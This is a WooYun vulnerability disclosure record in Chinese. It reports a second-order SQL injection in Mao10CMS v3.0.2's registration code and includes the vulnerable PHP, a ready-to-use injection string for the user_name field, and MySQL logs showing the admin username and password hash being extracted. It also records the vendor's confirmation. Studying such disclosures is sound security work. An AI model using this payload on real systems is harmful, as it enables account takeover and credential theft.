{"id": 41018, "wybug_id": "wooyun-2015-090196", "wybug_title": "Mao10CMS v3.0.2 一处有趣的sql注入。", "wybug_corp": "mao10.com", "wybug_author": "roker", "wybug_date": "2015-01-08 19:50", "wybug_open_date": "2015-04-13 16:58", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-11：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-03-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-03-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-13：\t细节向公众公开  简要描述： rt 详细说明：  用户注册处。\npublic function submit(){        $ip_false = M('option')->where(\"meta_key='ip_false' AND type='user'\")->getField('meta_value',true);        if($ip_false && in_array(mc_user_ip(), $ip_false)) {        \t$this->error('您的IP被永久禁止登陆！');        } else {\t        if(empty($_POST['user_name'])) {\t\t        $this->error('账号必须填写！');\t        } else {\t        \t$user_login = M('meta')->where(\"meta_key='user_name' AND type ='user'\")->getField('meta_value',true);\t        \tif(in_array(strip_tags($_POST['user_name']), $user_login)) {\t\t        \t$this->error('账号已存在！');\t        \t}\t        };\t        if(empty($_POST['user_email'])) {\t\t        $this->error('邮箱必须填写！');\t        } else {\t        \t$user_email = M('meta')->where(\"meta_key='user_email' AND type ='user'\")->getField('meta_value',true);\t        \tif(in_array(strip_tags($_POST['user_email']), $user_email)) {\t\t        \t$this->error('邮箱已存在！');\t        \t}\t        };\t        if(empty($_POST['user_pass'])) {\t\t        $this->error('密码必须填写！');\t        };\t        if($_POST['user_pass']!=$_POST['user_pass2']) {\t\t        $this->error('两次密码必须一致！');\t        };\t        $user['title'] = I('param.user_name');\t\t\t$user['content'] = '';\t\t\t$user['type'] = 'user';\t\t\t$user['date'] = strtotime(\"now\");\t\t\t$result = M(\"page\")->data($user)->add();\t\t\tif($result) {\t\t\t\tmc_add_meta($result,'user_name',I('param.user_name'),'user');\t\t\t\t$user_pass = md5(I('param.user_pass').mc_option('site_key'));\t\t\t\tmc_add_meta($result,'user_pass',$user_pass,'user');\t\t\t\tmc_add_meta($result,'user_email',I('param.user_email'),'user');\t\t\t\tmc_add_meta($result,'user_level','1','user');\t\t\t\tsession('user_name',I('param.user_name'));\t\t        session('user_pass',$user_pass);\t\t        $ip_array = M('action')->where(\"page_id='\".mc_user_id().\"' AND action_key='ip'\")->getField('action_value',true);\t\t        if($ip_array && in_array(mc_user_ip(), $ip_array)) {\t\t\t        \t\t        } else {\t\t\t        if(!mc_is_admin()) {\t\t\t\t        mc_add_action(mc_user_id(),'ip',mc_user_ip());\t\t\t        };\t\t        };\t\t        if($_POST['comefrom']) {\t\t\t        $this->success('注册成功',$_POST['comefrom']);\t\t        } else {\t\t\t        $this->success('注册成功',U('user/index/edit?id='.mc_user_id()));\t\t        }\t\t\t} else {\t\t\t\t$this->error('注册失败');\t\t\t}\t\t}    }}\n当用户名带入单引号时，虽然添加用户进入数据库时做了转义，但是赋值于session时又被带入了session('user_name',I('param.user_name'));然后我们来看看这个函数mc_user_id()/Application/Common/Common/function.php\nfunction mc_user_id() {\t$page_id = M('meta')->where(\"meta_key='user_name' AND meta_value='\".session('user_name').\"' AND type='user'\")->getField('page_id');\t$user_pass_true = mc_get_meta($page_id,'user_pass',true,'user');\tif(session('user_name') && session('user_pass') && session('user_pass') == $user_pass_true) {\t\treturn $page_id;\t}}\n这就到了这个漏洞比较有意思的地方了、由于不能报错 所以我们得让数据出现在$page_id。（延时太过麻烦 至少得注册几百个账户。。所以就不考虑了） 现在 session('user_name')是我们所能控制的，且能带入单引号。我们要让这个 $page_id 包含管理员的账户密码，同时也能通过mc_get_meta($page_id,'user_pass',true,'user'); 返回出正确的密码。同时 $page_id是由我们所能控制的user_name 通过 M('meta')->where(\"meta_key='user_name' AND meta_value='\".session('user_name').\"' AND type='user'\")->getField('page_id');返回的。听起来有点绕口~直接看利用代码和mysql日志吧~exp:\n' or meta_value%3D'admin') and 1=2 union select concat((select concat((SELECT meta_value from mc_meta where meta_key='user_name' and page_id=1),0x5c,(SELECT meta_value from mc_meta where meta_key='user_pass' and page_id=1))),'\\' or page_id=\\'14')%23\n(14是 注册id。先注册一个获取id。注入时在这个id加上1即可)\n\n首先添加账户进入数据库时是没问题的。做了转义\nINSERT INTO `mc_page` (`title`,`content`,`type`,`date`) VALUES ('\\' or meta_value=\\'admin\\') and 1=2 union select concat((select concat((SELECT meta_value from mc_meta where meta_key=\\'user_name\\' and page_id=1),0x5c,(SELECT meta_value from mc_meta where meta_key=\\'user_pass\\' and page_id=1))),\\'\\\\\\' or page_id=\\\\\\'14\\')#','','user',1420485430)\t\t  397 Query\tINSERT INTO `mc_meta` (`page_id`,`meta_key`,`meta_value`,`type`) VALUES (14,'user_name','\\' or meta_value=\\'admin\\') and 1=2 union select concat((select concat((SELECT meta_value from mc_meta where meta_key=\\'user_name\\' and page_id=1),0x5c,(SELECT meta_value from mc_meta where meta_key=\\'user_pass\\' and page_id=1))),\\'\\\\\\' or page_id=\\\\\\'14\\')#','user')\n然后 带入 mc_user_id（）函数时\n$page_id = M('meta')->where(\"meta_key='user_name' AND meta_value='\".session('user_name').\"' AND type='user'\")->getField('page_id');\n\nSELECT `page_id` FROM `mc_meta` WHERE ( meta_key='user_name' AND meta_value='' or meta_value='admin') and 1=2 union select concat((select concat((SELECT meta_value from mc_meta where meta_key='user_name' and page_id=1),0x5c,(SELECT meta_value from mc_meta where meta_key='user_pass' and page_id=1))),'\\' or page_id=\\'14')#' AND type='user' ) LIMIT 1\n此时 我们的$page_id 将返回\nadmin\\0d4c7cf4fa2ab6685251d746a8f8564c' or page_id='14\n然后 \t$user_pass_true = mc_get_meta($page_id,'user_pass',true,'user');\n397 Query\tSELECT `meta_value` FROM `mc_meta` WHERE ( page_id='admin\\0d4c7cf4fa2ab6685251d746a8f8564c' or page_id='14' AND meta_key='user_pass' AND type ='user' ) LIMIT 1\n 此时 返回的user_pass 就等于 我们session所对应的user_pass了。于是 将数据 \nadmin\\0d4c7cf4fa2ab6685251d746a8f8564c' or page_id='14\n返回 造成了注入\n\n   漏洞证明：  如上所述   修复方案：  加强过滤~   版权声明：转载请注明来源 roker@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-01-08 19:55 厂商回复： 感谢指正，存在BUG导致网站可能被注入。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-01-08 18:05 |    \t\t牛肉包子 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:64        )\t\t \n  前排膜拜爷爷    \n     2015-01-29 16:09 |    \t\txiaoL \t\t\t( 普通白帽子  |\t\t\t        Rank:361 漏洞数:67        | PKAV技术宅社区!Blog:http://www.xlixli....)\t\t \n  确实很有意思    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}